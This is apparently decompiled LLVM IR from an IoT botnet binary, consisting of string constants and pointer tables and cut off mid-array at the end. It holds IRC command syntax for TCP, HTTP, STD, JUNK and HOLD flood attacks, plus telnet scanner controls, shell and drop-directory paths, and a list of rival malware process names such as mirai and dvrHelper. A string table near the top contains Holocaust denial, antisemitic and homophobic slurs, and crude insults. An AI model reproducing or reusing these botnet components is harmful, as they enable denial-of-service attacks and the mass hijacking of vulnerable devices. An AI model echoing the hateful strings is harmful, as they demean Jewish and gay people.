@global_var_1002b600.429 = constant [24 x i8] c"Never gonna let you die\00"
@global_var_1002b618.430 = constant [21 x i8] c"Never gonna hurt you\00"
@global_var_1002b630.431 = constant [14 x i8] c"bush did 9/11\00"
@global_var_1002b640.432 = constant [32 x i8] c"jet fuel can't melt steel beams\00"
@global_var_1002b660.433 = constant [24 x i8] c"Kuze-senpai is your god\00"
@global_var_1002b678.434 = constant [23 x i8] c"the illuminati is real\00"
@global_var_1002b690.435 = constant [14 x i8] c"wake up sheep\00"
@global_var_1002b6a0.436 = constant [22 x i8] c"i flex like david ike\00"
@global_var_1002b6b8.437 = constant [35 x i8] c"6 million jews? show me the proof!\00"
@global_var_1002b6dc.438 = constant [18 x i8] c"T R I G G E R E D\00"
@global_var_1002b6f0.439 = constant [21 x i8] c"my gf killed herself\00"
@global_var_1002b708.440 = constant [22 x i8] c"free masons suck cock\00"
@global_var_1002b720.441 = constant [10 x i8] c"ihatejews\00"
@global_var_1002b72c.442 = constant [6 x i8] c"urgay\00"
@global_var_1002b734.443 = constant [16 x i8] c"tfw u like dick\00"
@global_var_1002b744.444 = constant [9 x i8] c"dickbutt\00"
@global_var_1002b750.445 = constant [20 x i8] c"The elusive dickbut\00"
@global_var_1002b764.446 = constant [27 x i8] c"Heyyy that's pretty gooood\00"
@global_var_1002b780.447 = constant [15 x i8] c"NSA sucks cock\00"
@global_var_1002b790.448 = constant [15 x i8] c"FBI sucks cock\00"
@global_var_1002b7a0.449 = constant [55 x i8] c"You name it they suck cockWhat am I doing with my life\00"
@global_var_1002b7d8.450 = constant [28 x i8] c"Oh yeah I like nulling shit\00"
@global_var_1002b7f4.451 = constant [29 x i8] c"HIIYYOOOOOOO (Customgrow420)\00"
@global_var_1002b814.452 = constant [28 x i8] c"Keemstar is a fucking knome\00"
@global_var_1002b830.453 = constant [17 x i8] c"Leafy is gawd <3\00"
@global_var_1002b844.454 = constant [25 x i8] c"Ourmine is full of skids\00"
@global_var_1002b860.455 = constant [23 x i8] c"Sh4dow is the greatest\00"
@global_var_1002b878.456 = constant [79 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2e0.378, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2e4.379, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2e8.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2ec.381, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b2f0.382, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2f8.383, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1002b2fc.384, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1002b308.385, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b314.386, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b318.387, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b31c.388, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b324.389, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1002b330.390, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b340.391, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1002b358.392, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1002b364.393, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_1002b378.394, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_1002b390.395, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_1002b3ac.396, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_1002b3d4.397, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_1002b3fc.398, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_1002b424.399, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1002b44c.400, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1002b45c.401, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1002b464.402, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1002b470.403, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1002b4a0.404, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b4b4.405, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1002b4c0.406, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b4d0.407, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1002b4e8.408, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b4d0.407, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1002b4f0.409, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1002b500.410, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1002b508.411, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1002b510.412, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1002b518.413, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_1002b520.414, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1002b544.415, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b558.416, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b560.417, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1002b568.418, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1002b570.419, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b578.420, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b584.421, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b58c.422, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b590.423, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b594.424, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1002b5a0.425, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_1002b5ac.426, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1002b5cc.427, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_1002b5e4.428, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1002b600.429, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b618.430, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1002b630.431, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1002b640.432, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1002b660.433, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_1002b678.434, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1002b690.435, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_1002b6a0.436, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_1002b6b8.437, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1002b6dc.438, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b6f0.439, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_1002b708.440, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1002b720.441, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b72c.442, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1002b734.443, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b744.444, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1002b750.445, i32 0, i32 0), i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_1002b764.446, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1002b780.447, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1002b790.448, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_1002b7a0.449, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_1002b7d8.450, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_1002b7f4.451, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_1002b814.452, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1002b830.453, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_1002b844.454, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_1002b860.455, i32 0, i32 0)]
@global_var_1000959c.457 = constant [3 x i8] c"8`\00"
@global_var_100095a4.458 = constant i32 939524096
@global_var_1002b9bc.459 = constant [35 x i8] c"NOTICE %s :STD <ip> <port> <time>\0A\00"
@global_var_10009618.460 = constant [3 x i8] c"8`\00"
@global_var_1002b9e0.461 = constant [32 x i8] c"NOTICE %s :STD attacking %s:%s\0A\00"
@global_var_100096f0.462 = constant [3 x i8] c"8`\00"
@global_var_100096f8.463 = constant [3 x i8] c"8`\00"
@global_var_10009780.464 = constant [3 x i8] c"8`\00"
@global_var_1002ba00.465 = constant [7 x i8] c"(null)\00"
@global_var_1000ab84.466 = constant [3 x i8] c"8`\00"
@global_var_1002ba40.467 = constant [92 x i8] c"NOTICE %s :TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads>\0A\00"
@global_var_1000b294.468 = constant i32 1207960248
@global_var_1002ba9c.469 = constant [54 x i8] c"NOTICE %s :TCP flooding %s:%d with %s and %d threads\0A\00"
@global_var_1000b544.470 = constant [3 x i8] c"8`\00"
@global_var_1002bad4.471 = constant [6 x i8] c"close\00"
@global_var_1002badc.472 = constant [11 x i8] c"keep-alive\00"
@global_var_1002bae8.473 = constant [7 x i8] c"accept\00"
@global_var_1002bafc.477 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0AConnection: %s\0D\0A\0D\0A\00"
@global_var_1000b83c.478 = constant i32 939524096
@global_var_1000b8b4.479 = constant [3 x i8] c"8`\00"
@global_var_1002bb3c.480 = constant [64 x i8] c"NOTICE %s :HTTP <method> <target> <port> <path> <time> <power>\0A\00"
@global_var_1002bb7c.481 = constant [46 x i8] c"NOTICE %s :HTTP %s flooding %s with %d power\0A\00"
@global_var_1000baa4.482 = constant [3 x i8] c"8`\00"
@global_var_1000baac.483 = constant [3 x i8] c"8`\00"
@global_var_1000bb6c.484 = constant [3 x i8] c"8`\00"
@global_var_1000bcc0.485 = constant i32 939525120
@global_var_1000be1c.486 = constant i32 1207960240
@global_var_1002bbac.487 = constant [36 x i8] c"NOTICE %s :JUNK <ip> <port> <time>\0A\00"
@global_var_1000c19c.488 = constant i32 1207959712
@global_var_1002bbd0.489 = constant [32 x i8] c"NOTICE %s :JUNK flooding %s:%s\0A\00"
@global_var_1000c35c.490 = constant [3 x i8] c"8`\00"
@global_var_1000c4b0.491 = constant i32 1207960392
@global_var_1002bbf0.492 = constant [36 x i8] c"NOTICE %s :HOLD <ip> <port> <time>\0A\00"
@global_var_1000c8c8.493 = constant i32 1207959712
@global_var_1002bc14.494 = constant [32 x i8] c"NOTICE %s :HOLD flooding %s:%s\0A\00"
@global_var_1002a028.496 = constant i32 587202560
@global_var_1002a030.498 = constant [6 x i8] c"shell\00"
@global_var_10029fa4.500 = constant [7 x i8] c"nvalid\00"
@global_var_10029fac.501 = constant [6 x i8] c"ailed\00"
@global_var_10029fb4.502 = constant [9 x i8] c"ncorrect\00"
@global_var_10029fc0.503 = constant [6 x i8] c"enied\00"
@global_var_10029fc8.504 = constant [6 x i8] c"error\00"
@global_var_10029fd0.505 = constant [8 x i8] c"goodbye\00"
@global_var_10029fd8.506 = constant [4 x i8] c"bad\00"
@global_var_10029fdc.507 = constant [8 x i8] c"timeout\00"
@global_var_100406b4.508 = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029fa4.500, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029fac.501, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029fb4.502, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029fc0.503, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029fc8.504, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029fd0.505, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029fd8.506, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029fdc.507, i32 0, i32 0)]
@global_var_1000cf1c.509 = constant i32 939524098
@global_var_1000d124.510 = constant i32 939524097
@global_var_1000d2d4.511 = constant i32 939524096
@global_var_1002bc34.512 = constant [6 x i8] c":>%$#\00"
@global_var_1000d7b0.513 = constant i32 939524096
@global_var_1000d844.514 = constant [3 x i8] c"8`\00"
@global_var_1000d864.515 = constant i32 1208005569
@global_var_1000d940.516 = constant i32 939524096
@global_var_1002bd40.517 = constant i32 -123612
@global_var_1000dd0c.518 = constant i32 1207963276
@global_var_1000dd2c.519 = constant i32 1207963244
@global_var_1002a040.539 = constant [5 x i8] c"rror\00"
@global_var_1002a048.540 = constant [7 x i8] c"oodbye\00"
@global_var_10028c98.541 = constant [8 x i8] c"busybox\00"
@global_var_100451c4.545 = local_unnamed_addr global i32 0
@global_var_1002a050.550 = constant [3 x i8] c"sh\00"
@global_var_1002a054.551 = constant [8 x i8] c"/bin/sh\00"
@global_var_1002a05c.552 = constant [5 x i8] c"dash\00"
@global_var_10029fe4.555 = constant [6 x i8] c"/tmp/\00"
@global_var_10029fec.556 = constant [6 x i8] c"/var/\00"
@global_var_10029ff4.557 = constant [10 x i8] c"/var/run/\00"
@global_var_1002a000.558 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1002a00c.559 = constant [6 x i8] c"/mnt/\00"
@global_var_1002a014.560 = constant [7 x i8] c"/boot/\00"
@global_var_1002a01c.561 = constant [6 x i8] c"/usr/\00"
@global_var_10045168.572 = local_unnamed_addr global i32 0
@global_var_1002bd64.573 = constant [29 x i8] c"NOTICE %s :SCANNER <ON/OFF>\0A\00"
@global_var_1000ecf4.574 = constant i32 1207960056
@global_var_1002bd84.575 = constant [3 x i8] c"ON\00"
@global_var_1002bd88.576 = constant [3 x i8] c"on\00"
@global_var_1002bd8c.577 = constant [43 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\0A\00"
@global_var_1000ed90.578 = constant i32 1207959900
@global_var_1002bdb8.579 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO START SCANNER!\0A\00"
@global_var_1000edb4.580 = constant i32 1207959864
@global_var_1002bdec.581 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER ALREADY STARTED!\0A\00"
@global_var_1000edd8.582 = constant i32 1207959828
@global_var_1002be20.583 = constant [4 x i8] c"OFF\00"
@global_var_1002be24.584 = constant [4 x i8] c"off\00"
@global_var_1002be28.585 = constant [42 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER KILLED!\0A\00"
@global_var_1002be54.586 = constant [50 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO KILL SCANNER!\0A\00"
@global_var_1000eeac.587 = constant i32 1207959616
@global_var_1002be88.588 = constant [47 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER NOT STARTED!\0A\00"
@global_var_1000eed0.589 = constant i32 1207959580
@global_var_10028a80.590 = constant [8 x i8] c"mirai.*\00"
@global_var_10028a88.591 = constant [10 x i8] c"dlr.*mips\00"
@global_var_10028a94.592 = constant [7 x i8] c"mips64\00"
@global_var_10028a9c.593 = constant [7 x i8] c"mipsel\00"
@global_var_10028aa4.594 = constant [6 x i8] c"sh2eb\00"
@global_var_10028aac.595 = constant [7 x i8] c"sh2elf\00"
@global_var_10028ab4.596 = constant [4 x i8] c"sh4\00"
@global_var_10028ab8.597 = constant [4 x i8] c"x86\00"
@global_var_10028abc.598 = constant [4 x i8] c"arm\00"
@global_var_10028ac0.599 = constant [6 x i8] c"armv5\00"
@global_var_10028ac8.600 = constant [8 x i8] c"armv4tl\00"
@global_var_10028ad0.601 = constant [6 x i8] c"armv4\00"
@global_var_10028ad8.602 = constant [6 x i8] c"armv6\00"
@global_var_10028ae0.603 = constant [5 x i8] c"i686\00"
@global_var_10028ae8.604 = constant [8 x i8] c"powerpc\00"
@global_var_10028af0.605 = constant [13 x i8] c"powerpc440fp\00"
@global_var_10028b00.606 = constant [5 x i8] c"i586\00"
@global_var_10028b08.607 = constant [5 x i8] c"m68k\00"
@global_var_10028b10.608 = constant [6 x i8] c"sparc\00"
@global_var_10028b18.609 = constant [7 x i8] c"x86_64\00"
@global_var_10028b20.610 = constant [8 x i8] c"jackmy*\00"
@global_var_10028b28.611 = constant [8 x i8] c"hackmy*\00"
@global_var_10028b30.612 = constant [3 x i8] c"b1\00"
@global_var_10028b34.613 = constant [3 x i8] c"b2\00"
@global_var_10028b38.614 = constant [3 x i8] c"b3\00"
@global_var_10028b3c.615 = constant [3 x i8] c"b4\00"
@global_var_10028b40.616 = constant [3 x i8] c"b5\00"
@global_var_10028b44.617 = constant [3 x i8] c"b6\00"
@global_var_10028b48.618 = constant [3 x i8] c"b7\00"
@global_var_10028b4c.619 = constant [3 x i8] c"b8\00"
@global_var_10028b50.620 = constant [3 x i8] c"b9\00"
@global_var_10028b54.621 = constant [4 x i8] c"b10\00"
@global_var_10028b58.622 = constant [4 x i8] c"b11\00"
@global_var_10028b5c.623 = constant [4 x i8] c"b12\00"
@global_var_10028b60.624 = constant [4 x i8] c"b13\00"
@global_var_10028b64.625 = constant [4 x i8] c"b14\00"
@global_var_10028b68.626 = constant [4 x i8] c"b15\00"
@global_var_10028b6c.627 = constant [4 x i8] c"b16\00"
@global_var_10028b70.628 = constant [4 x i8] c"b17\00"
@global_var_10028b74.629 = constant [4 x i8] c"b18\00"
@global_var_10028b78.630 = constant [4 x i8] c"b19\00"
@global_var_10028b7c.631 = constant [4 x i8] c"b20\00"
@global_var_10028b80.632 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_10028b94.633 = constant [10 x i8] c"dvrHelper\00"
@global_var_10028ba0.634 = constant [5 x i8] c"kmy*\00"
@global_var_10028ba8.635 = constant [5 x i8] c"lol*\00"
@global_var_10028bb0.636 = constant [8 x i8] c"telmips\00"
@global_var_10028bb8.637 = constant [10 x i8] c"telmips64\00"
@global_var_10028bc4.638 = constant [10 x i8] c"telmipsel\00"
@global_var_10028bd0.639 = constant [9 x i8] c"telsh2eb\00"
@global_var_10028bdc.640 = constant [10 x i8] c"telsh2elf\00"
@global_var_10028be8.641 = constant [7 x i8] c"telsh4\00"
@global_var_10028bf0.642 = constant [7 x i8] c"telx86\00"
@global_var_10028bf8.643 = constant [9 x i8] c"telarmv5\00"
@global_var_10028c04.644 = constant [11 x i8] c"telarmv4tl\00"
@global_var_10028c10.645 = constant [9 x i8] c"telarmv4\00"
@global_var_10028c1c.646 = constant [9 x i8] c"telarmv6\00"
@global_var_10028c28.647 = constant [8 x i8] c"teli686\00"
@global_var_10028c30.648 = constant [11 x i8] c"telpowerpc\00"
@global_var_10028c3c.649 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_10028c4c.650 = constant [8 x i8] c"teli586\00"
@global_var_10028c54.651 = constant [8 x i8] c"telm68k\00"
@global_var_10028c5c.652 = constant [9 x i8] c"telsparc\00"
@global_var_10028c68.653 = constant [10 x i8] c"telx86_64\00"
@global_var_10028c74.654 = constant [9 x i8] c"TwoFace*\00"
@global_var_10028c80.655 = constant [5 x i8] c"xxb*\00"
@global_var_10028c88.656 = constant [3 x i8] c"bb\00"
@global_var_10028c8c.657 = constant [11 x i8] c"busybotnet\00"
@global_var_10028ca0.658 = constant [7 x i8] c"badbox\00"
@global_var_10028ca8.659 = constant [3 x i8] c"B1\00"
@global_var_10028cac.660 = constant [3 x i8] c"B2\00"
@global_var_10028cb0.661 = constant [3 x i8] c"B3\00"
@global_var_10028cb4.662 = constant [3 x i8] c"B4\00"
@global_var_10028cb8.663 = constant [3 x i8] c"B5\00"
@global_var_10028cbc.664 = constant [3 x i8] c"B6\00"
@global_var_10028cc0.665 = constant [3 x i8] c"B7\00"
@global_var_10028cc4.666 = constant [3 x i8] c"B8\00"
@global_var_10028cc8.667 = constant [3 x i8] c"B9\00"
@global_var_10028ccc.668 = constant [4 x i8] c"B10\00"
@global_var_10028cd0.669 = constant [4 x i8] c"B11\00"
@global_var_10028cd4.670 = constant [4 x i8] c"B12\00"
@global_var_10028cd8.671 = constant [4 x i8] c"B13\00"
@global_var_10028cdc.672 = constant [4 x i8] c"B14\00"
@global_var_10028ce0.673 = constant [4 x i8] c"B15\00"
@global_var_10028ce4.674 = constant [4 x i8] c"B16\00"
@global_var_10028ce8.675 = constant [4 x i8] c"B17\00"
@global_var_10028cec.676 = constant [4 x i8] c"B18\00"
@global_var_10028cf0.677 = constant [4 x i8] c"B20\00"
@global_var_10028cf4.678 = constant [7 x i8] c"gaybot\00"
@global_var_10028cfc.679 = constant [6 x i8] c"hackz\00"
@global_var_10028d04.680 = constant [5 x i8] c"bin*\00"
@global_var_10028d0c.681 = constant [5 x i8] c"gtop\00"
@global_var_10028d14.682 = constant [7 x i8] c"botnet\00"
@global_var_10028d1c.683 = constant [8 x i8] c"swatnet\00"
@global_var_10028d24.684 = constant [8 x i8] c"ballpit\00"
@global_var_10028d2c.685 = constant [8 x i8] c"fucknet\00"
@global_var_10028d34.686 = constant [9 x i8] c"cracknet\00"
@global_var_10028d40.687 = constant [8 x i8] c"weednet\00"
@global_var_10028d48.688 = constant [7 x i8] c"gaynet\00"
@global_var_10028d50.689 = constant [9 x i8] c"queernet\00"
@global_var_10028d5c.690 = constant [8 x i8] c"ballnet\00"
@global_var_10028d64.691 = constant [5 x i8] c"unet\00"
@global_var_10028d6c.692 = constant [7 x i8] c"yougay\00"
@global_var_10028d74.693 = constant [7 x i8] c"sttftp\00"
@global_var_10028d7c.694 = constant [7 x i8] c"sstftp\00"
@global_var_10028d84.695 = constant [7 x i8] c"sbtftp\00"
@global_var_10028d8c.696 = constant [6 x i8] c"btftp\00"
@global_var_10028d94.697 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_10028da0.698 = constant [6 x i8] c"bruv*\00"
@global_var_10028da8.699 = constant [5 x i8] c"IoT*\00"
@global_var_10028db0.700 = constant [6 x i8] c"kawi*\00"
@global_var_10028db8.701 = constant [6 x i8] c"kiwi*\00"
@global_var_10028dc0.702 = constant [8 x i8] c"botgod*\00"
@global_var_100400ec.703 = global [114 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028a80.590, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028a88.591, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028a94.592, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028a9c.593, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028aa4.594, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028aac.595, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028ab4.596, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028ab8.597, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028abc.598, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028ac0.599, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028ac8.600, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028ad0.601, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028ad8.602, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028ae0.603, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028ae8.604, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10028af0.605, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028b00.606, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028b08.607, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028b10.608, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028b18.609, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028b20.610, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028b28.611, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b30.612, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b34.613, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b38.614, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b3c.615, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b40.616, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b44.617, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b48.618, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b4c.619, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b50.620, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b54.621, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b58.622, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b5c.623, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b60.624, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b64.625, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b68.626, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b6c.627, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b70.628, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b74.629, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b78.630, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b7c.631, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10028b80.632, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028b94.633, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028ba0.634, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028ba8.635, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028bb0.636, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028bb8.637, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028bc4.638, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028bd0.639, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028bdc.640, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028be8.641, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028bf0.642, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028bf8.643, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10028c04.644, i32 0, i32 